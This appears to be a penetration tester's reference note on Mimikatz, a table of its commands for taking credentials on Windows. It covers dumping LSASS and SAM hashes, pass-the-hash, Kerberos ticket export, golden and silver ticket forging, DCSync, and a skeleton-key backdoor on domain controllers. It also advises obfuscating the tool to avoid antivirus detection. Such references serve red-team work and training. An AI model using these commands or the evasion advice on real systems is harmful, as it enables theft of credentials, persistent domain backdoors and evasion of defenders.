Mimikatz is a windows tool used to enumerate passwords and hashes from the Windows SAM, which can be acquired by Mimikatz or via a process dump by [[Procdump]] or in Task Manager. 

> [!danger] Detection Risk 
> Mimikatz is well signatured. This must be obfuscated or otherwise disguised before running, as with most tools. 

Mimikatz is run as an executable and prompts the user with a command line interface.

| Mimikatz Command                                                                                                                                                                                                               | Description                                                                                                                                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `privilege::debug`                                                                                                                                                                                                             | Check for SeDebugPrivilege availability in current session                                                                                                               |
| `sekurlsa::msv`                                                                                                                                                                                                                | Pull password hashes from LSASS memory via injection.                                                                                                                    |
| `sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>`                                                                                                                                                                     | Perform a Pass-The-Hash attack to impersonate a new user                                                                                                                 |
| `sekurlsa::logonPasswords`                                                                                                                                                                                                     | Get passwords and hashes from a dump file                                                                                                                                |
| `sekurlsa::minidump \<dumpfile\>`                                                                                                                                                                                              | Examine a specific .dmp file gnerated via procdump or TM                                                                                                                 |
| `sekurlsa::ekeys`                                                                                                                                                                                                              | List Kerberos encryption keys                                                                                                                                            |
| `sekurlsa::dpapi`                                                                                                                                                                                                              | List DPAPI master keys for browser-stored credentials and the Windows Credential Vault                                                                                   |
| `sekurlsa::tickets /export`                                                                                                                                                                                                    | Export Kerberos tickets in memory to files for PTT.                                                                                                                      |
| `kerberos::ptt <ticket>`                                                                                                                                                                                                       | Perform PTT attack and store a provided ticket in memory. (Verify with `klist` outside of mimikatz)                                                                      |
| `kerberos::golden /user:<your username> /domain:<domain> /sid:<SID> /krbtgt:<KRBTGT hash from lsa (golden only)> /service:<service name (silver only) /rc4:<Service NTLM hash (silver only)> /id:<500 (golden)/1103 (silver)>` | Create a golden or silver ticket with Mimikatz and add it to your mimikatz session.                                                                                      |
| `lsadump::sam`                                                                                                                                                                                                                 | Dump the SAM                                                                                                                                                             |
| `lsadump::dcsync /domain:contoso.local /user:adminisrtator@contoso.local`                                                                                                                                                      | Request a DC sync to acquire the NTLM (or RC4 decrypted) hash for the given user. Must be run in the context of a user with DCSync rights.                               |
| `lsadump::cache`                                                                                                                                                                                                               | Load cached credentials from the registry                                                                                                                                |
| `lsadump::lsa /inject /name:krbtgt`                                                                                                                                                                                            | Dump the KRBTGT for creating Golden Tickets. Change `krbtgt` to a service account or DA to make a silver ticket.                                                         |
| `lsadump::secrets`                                                                                                                                                                                                             | Dump secrets on host, including active TGTs in memory owned by service accounts and cleartext credentials for logged-in users.                                           |
| `vault::list`                                                                                                                                                                                                                  | List the vaults on a system                                                                                                                                              |
| `vault:cred`                                                                                                                                                                                                                   | List credentials in a vault                                                                                                                                              |
| `misc::cmd`                                                                                                                                                                                                                    | Open an elevated command prompt with the privileges/tickets currently obtained.                                                                                          |
| `misc::skeleton`                                                                                                                                                                                                               | Inject a skeleton key backdoor into the forest's memory. From here, you may use the password 'mimikatz' with any user in the domain. Must be run on a domain controller. |

See also: [[Pypykatz]]